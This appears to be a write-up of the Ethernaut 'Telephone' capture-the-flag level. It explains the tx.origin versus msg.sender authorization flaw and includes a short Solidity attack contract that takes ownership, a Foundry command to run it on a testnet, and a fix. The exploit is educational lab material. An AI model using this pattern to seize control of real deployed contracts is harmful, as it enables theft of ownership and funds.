# Ethernaut 4 - Telephone

## Challenge Overview

The Telephone challenge demonstrates a critical vulnerability related to the difference between `tx.origin` and `msg.sender` in Ethereum smart contracts.

## Vulnerability Analysis

The vulnerable contract has a `changeOwner` function that checks:

```solidity
if (tx.origin != msg.sender) {
  owner = _owner;
}
```

### The Problem

- `tx.origin`: The address that initiated the transaction (the EOA that signed the transaction)
- `msg.sender`: The address that called the current function (could be a contract or EOA)

When a user calls a contract directly, `tx.origin == msg.sender`. However, when a contract calls another contract, `tx.origin` remains the original user, but `msg.sender` becomes the calling contract's address.

## Solution Strategy

We exploit this by creating an intermediary contract (`Attack.sol`) that calls the `changeOwner` function. This way:

- `tx.origin` = our EOA address
- `msg.sender` = the Attack contract address
- Since `tx.origin != msg.sender`, the condition passes and we become the owner

## Files Structure

- `src/Telephone.sol` - The vulnerable contract
- `src/Attack.sol` - Our exploit contract
- `script/Solve.s.sol` - Foundry script to execute the attack

## Attack Contract

```solidity
contract Attack {
    Telephone public telephone;

    constructor(Telephone _telephone){
        telephone = _telephone;
    }

    function steelOwnership() external {
        telephone.changeOwner(msg.sender);
    }
}
```

## Execution

The attack is executed through the Foundry script which:

1. Deploys the Attack contract with the Telephone instance
2. Calls `steelOwnership()` which triggers the vulnerability
3. Successfully changes ownership

## Challenge Parameters On Arbitrum Sepolia

- **Submit level txnHash**: `0xb6b43e648c2d7d05be880cb1888c904d94d6f86056438458a1e2a4801e8d73c1`
- **Instance address**: `0x46f5C472B3F81bA00240Ae0523feDe2eb65D41b9`
- **Level address**: `0xba6F0B5784B6580790584A553f6e4a3483a915c3`

## Key Learning Points

1. **tx.origin vs msg.sender**: Understanding the difference is crucial for secure smart contract development
2. **Never use tx.origin for authorization**: Always use `msg.sender` for access control
3. **Contract-to-contract interactions**: Be aware of how calls through contracts affect these variables

## Prevention

To fix this vulnerability, the contract should use `msg.sender` instead of `tx.origin`:

```solidity
function changeOwner(address _owner) public {
    if (msg.sender == owner) {  // Use msg.sender instead of tx.origin
        owner = _owner;
    }
}
```

## Running the Solution

```zsh
forge script script/Solve.s.sol --rpc-url <RPC_URL> --private-key <PRIVATE_KEY> --sender <MSG_SENDER> --broadcast
```

This challenge demonstrates why `tx.origin` should never be used for authorization in smart contracts, as it can be easily bypassed through contract intermediaries.
